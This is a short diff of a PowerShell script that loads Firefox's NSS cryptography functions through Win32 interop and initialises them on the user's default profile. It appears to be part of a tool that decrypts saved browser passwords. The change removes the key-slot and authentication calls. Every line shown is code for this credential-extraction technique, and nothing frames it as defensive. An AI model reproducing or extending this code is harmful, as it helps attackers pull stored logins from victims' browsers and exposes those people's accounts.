@@ -879,14 +879,6 @@
     $NSSInitDelegates = Get-DelegateType @([string]) ([long])
     $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSInitAddr, $NSSInitDelegates)
 
-    $PK11GetKeySlotAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11_GetInternalKeySlot")
-    $PK11GetKeySlotDelegates = Get-DelegateType @() ([long])
-    $PK11_GetKeySlot = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11GetKeySlotAddr, $PK11GetKeySlotDelegates)
-
-    $PK11AuthenticateAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11_Authenticate")
-    $PK11AuthenticateDelegates = Get-DelegateType @([long], [bool], [long]) ([long])
-    $PK11_Authenticate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11AuthenticateAddr, $PK11AuthenticateDelegates)
-
     $NSSBase64_DecodeBufferAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSSBase64_DecodeBuffer")
     $NSSBase64_DecodeBufferDelegates = Get-DelegateType @([IntPtr], [IntPtr], [string], [int]) ([int])
     $NSSBase64_DecodeBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSBase64_DecodeBufferAddr, $NSSBase64_DecodeBufferDelegates)
@@ -900,10 +892,6 @@
     $defaultProfile = $(Get-ChildItem $profilePath).FullName
     $NSSInitResult = $NSS_Init.Invoke($defaultProfile)
     Write-Verbose "[+]NSS_Init result: $NSSInitResult"
-    $keySlot = $PK11_GetKeySlot.Invoke()
-    Write-Verbose "[+]Keyslot : $keySlot"
-    #$PK11_AuthResult = $PK11_Authenticate.Invoke($keySlot, $True, 0)
-    #Write-Verbose "[+]PK11_Authenticate Result: $PK11_AuthResult"
     
 
     if(Test-Path $defaultProfile)
